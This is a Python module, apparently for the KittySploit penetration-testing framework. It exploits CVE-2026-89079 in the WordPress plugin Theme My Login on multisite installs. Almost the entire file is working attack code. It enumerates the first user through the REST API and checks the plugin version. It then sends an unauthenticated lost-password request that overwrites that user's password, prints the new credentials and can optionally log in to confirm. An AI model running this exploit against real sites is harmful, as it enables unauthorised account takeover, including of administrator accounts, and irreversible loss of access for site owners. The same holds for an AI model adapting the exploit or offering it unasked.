#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Theme My Login CVE-2026-89079 — multisite lost-password password overwrite."""

import json
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Theme My Login CVE-2026-89079 password overwrite",
        "description": (
            "Auxiliary for CVE-2026-89079: on WordPress multisite with Theme My Login <= 7.2.1 "
            "and tml_user_passwords enabled, lost-password POST with user_pass1/user_pass2 overwrites "
            "the target password. Delivers credentials only — use wp-login separately for a session."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-89079"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-89079",
            "https://patchstack.com/database/wordpress/plugin/theme-my-login/vulnerability/wordpress-theme-my-login-plugin-7-2-1-unauthenticated-privilege-escalation-vulnerability",
        ],
        "tags": [
            "wordpress",
            "theme-my-login",
            "multisite",
            "password-reset",
            "auxiliary",
            "cve-2026-89079",
        ],
        "agent": {
            "risk": "critical",
            "effects": ["active_exploitation", "credential_access"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["credentials", "exploit_paths"],
            "chain": {
                "suggested_followups": [
                    "scanner/http/theme_my_login_cve_2026_89079_detect",
                ],
            },
        },
    }

    path = OptString("/", "WordPress base path", required=False)
    username = OptString("", "Target user login/slug (empty = enumerate first REST user)", required=False)
    new_password = OptString("", "Password to set (empty = random)", required=False)
    verify_login = OptBool(
        False,
        "Optionally attempt wp-login after overwrite (informational only)",
        required=False,
        advanced=True,
    )

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def _resolve_user(self) -> str:
        forced = (self.username or "").strip()
        if forced:
            return forced
        response = self.http_request(
            method="GET",
            path=self._join("/wp-json/wp/v2/users"),
            params={"per_page": "1", "orderby": "id", "order": "asc"},
            allow_redirects=False,
        )
        if not response or response.status_code != 200:
            return ""
        try:
            users = json.loads(response.text or "[]")
        except json.JSONDecodeError:
            return ""
        if not users:
            return ""
        return str(users[0].get("slug") or users[0].get("name") or "").strip()

    def check(self):
        user = self._resolve_user()
        if not user:
            return {"vulnerable": False, "reason": "No target user (REST enum failed)", "confidence": "low"}
        readme = self.http_request(
            method="GET",
            path=self.wp_plugin_path(self._base(), "theme-my-login", "readme.txt"),
            allow_redirects=True,
        )
        if not readme or readme.status_code != 200:
            return {"vulnerable": False, "reason": "Theme My Login not detected", "confidence": "medium"}
        version = self.wp_extract_version_from_readme(readme.text or "") or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), (7, 2, 1)):
            return {"vulnerable": False, "reason": f"Plugin version {version} appears patched", "confidence": "high"}
        return {
            "vulnerable": True,
            "reason": f"Theme My Login <= 7.2.1 with user {user}",
            "confidence": "medium",
        }

    def run(self):
        chk = self.check()
        if not chk.get("vulnerable"):
            print_error(chk.get("reason"))
            return False
        user = self._resolve_user()
        password = (self.new_password or "").strip() or f"Tml{secrets.token_hex(5)}!Xk9"
        print_status(f"Target user: {user}")
        self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            params={"action": "lostpassword"},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "user_login": user,
                "user_pass1": password,
                "user_pass2": password,
                "redirect_to": "",
                "wp-submit": "Get New Password",
                "action": "lostpassword",
            },
            allow_redirects=False,
        )
        print_success("Password overwrite request sent")
        print_status(f"Credentials: {user}:{password}")
        if not self.verify_login:
            return True
        login = self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": "wordpress_test_cookie=WP Cookie check",
            },
            data={
                "log": user,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": self._join("/wp-admin/"),
                "testcookie": "1",
            },
            allow_redirects=False,
        )
        if login and login.status_code == 302 and "wordpress_logged_in" in str(login.headers):
            print_status("Optional login check: wordpress_logged_in cookie received")
        else:
            print_info("Optional login check failed (multisite / tml_user_passwords may apply)")
        return True
